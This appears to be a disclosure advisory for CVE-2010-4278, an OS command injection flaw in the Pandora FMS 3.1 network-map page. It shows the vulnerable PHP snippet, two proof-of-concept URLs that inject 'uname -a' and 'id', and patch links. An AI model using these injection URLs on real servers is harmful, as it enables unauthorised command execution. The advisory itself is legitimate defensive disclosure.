@@ -1,0 +1,121 @@
+[+] Introduction
+
+Pandora FMS (for Pandora Flexible Monitoring System) is a software
+solution for monitoring computer networks. It allows monitoring in a
+visual way the status and performance of several parameters from
+different operating systems, servers, applications and hardware systems
+such as firewalls, proxies, databases, web servers or routers.
+
+It can be deployed in almost any operating system. It features remote
+monitoring (WMI, SNMP, TCP. UDP, ICMP, HTTP...) and it can also use
+agents. An agent is available for each platform. It can also monitor
+hardware systems with a TCP/IP stack, such as load balancers, routers,
+network switches, printers or firewalls.
+
+This software has several servers that process and get information from
+different sources, using WMI for gathering remote Windows information, a
+predictive server, a plug-in server which makes complex user-defined
+network tests, an advanced export server to replicate data between
+different sites of Pandora FMS, a network discovery server, and an SNMP
+Trap console.
+
+Released under the terms of the GNU General Public License, Pandora FMS
+is free software.
+
+2) OS Command Injection - CVE-2010-4278 - CVSS 9/10
+
+The layout parameter in file operation/agentes/networkmap.php is not
+properly filtered and allows an attacker to inject OS commands.
+
+Snippet of vulnerable code (file operation/agentes/networkmap.php):
+
+32 $layout = (string) get_parameter ('layout', 'radial');
+...
+137 $filename_map = $config["attachment_store"]."/networkmap_".$layout;
+138 $filename_img = "attachment/networkmap_".$layout."_".$font_size;
+139 $filename_dot = $config["attachment_store"]."/networkmap_".$layout;
+...
+162                 $cmd = "$filter -Tcmapx -o".$filename_map." -Tpng
+- -o".$filename_img." ".$filename_dot;
+163                 $result = system ($cmd);
+
+PoC:
+
+http://servername/pandora_console/index.php?login=1&login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;uname%20-a;
+http://servername/pandora_console/index.php?login=1&sec=estado&sec2=operation/agentes/networkmap&refr=0&layout=1;id;
+
+If we use vulnerability #1 (that permits bypass the authentication
+system and login as admin) with this issue, the CVSS will be 10/10.
+
+
+[+] Impact
+
+An attacker can execute commands of the operating system, inject remote
+code in the context of the application, get arbitrary files from the
+filesystem or extract any data of the database including passwords and
+confidential information about the monitored network/systems. Also it is
+possible to bypass the authentication or scale privileges to became
+admin, gaining full control of the web application and web server. These
+vulnerabilities have a high impact to the confidentiality, integrity,
+and availability of the system.
+
+
+[+] Systems affected
+
+Versions prior and including 3.1 of Pandora FMS are affected
+
+
+[+] Solution
+
+Apply the security fix for version 3.1:
+http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/Final%20version%20%28Stable%29/pandorafms_console-3.1_security_patch_13Oct2010.tar.gz/download
+
+
+Or upgrade to version 3.1.1 from
+http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/3.1.1/
+
+
+[+] Timeline
+
+Ago 2010: First contact to vendor
+Ago 2010: Confirmation of vendor
+Sept 2010: Second contact: SQL Injection vulnerabilities
+Sept 2010: Confirmation that the fix will be released on October
+Oct 2010: PandoraFMS security patch for 3.1 version released
+Oct 2010: Request for CVE numbers
+Nov 2010: PandoraFMS version 3.1.1 released
+Nov 2010: Disclosure of this advisory
+
+
+[+] References
+
+Official PandoraFMS site: http://pandorafms.org/
+SourceForge PandoraFMS site: http://sourceforge.net/projects/pandora/
+Wikipedia entry about PandoraFMS: http://en.wikipedia.org/wiki/Pandora_FMS
+Common Vulnerability Scoring System (CVSS) v2 calculator:
+http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
+Common Vulnerabilities and Exposures (CVE): http://cve.mitre.org/
+
+
+[+] Credits
+
+These vulnerabilities has been discovered by Juan Galiana Lara -
+@jgaliana - http://juangaliana.blogspot.com/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.10 (GNU/Linux)
+
+iQIcBAEBAgAGBQJM9NctAAoJEJaV5RMdiDI7cTMP/jzyDB8hcuTGYy+hHnehx0Fy
+YbVmWTMCUhIHZ6Y6ke1xLbFf0itFm/tMSvqC/20cAKC0x+QEmEVoSJPerT+Fc/3s
+IVjIEMxBbaKNM6inAElng5BzC0MTOjI+njtpF7pmLaIFBy8C77+u/LNrSM7tucy9
+WIx6ILVGSO0LY5vfgwdRAcJow6p/wn50U4Ur2XOVZ/X10Gbsb+9qMd4+q1d87Cw4
+cC+mqTefLeP8FNh6PB2tJpdpQqJ3R2G8719fHgmDm/5SVBkoXZRhjHKokR9+wtzP
+JPJWP3z1Zt+Wtn3+ANakDItBenbgafM2lMe0tkiy9LoQKMKepibLqOf9xfrKqTnP
+8CRffcV8nLorGBoKk7UKVb3I14llt34cu+Vcx2+WgDz37hXV1iK7pufGuFxVVRE4
+7etidHR9n7gO1WPbLmrKq4rrR02zhYnAHsGwjtFQId3ufRGSBTno3yNHFj1j0EvH
+pARhwbRtjIiSk8JF3TjeTswGMpCIItpQ051K4Bcpbtzte7fX05CLoaF6xyJBJlS5
+yNuxaBnGZYVOvUd+emosH+5ngW7Qk8/wXljx2OyVOu6ip75UZ277MRLBJvlq+NC4
+oBllQOzv521fd5hkgYEQ8VZQgWCzbeRTuh+t4z+MUHKTQlcE2I0ba9C6xdn0nkZF
+sn9vRJk4gc/PozOXDjC3
+=WmOh
+-----END PGP SIGNATURE-----
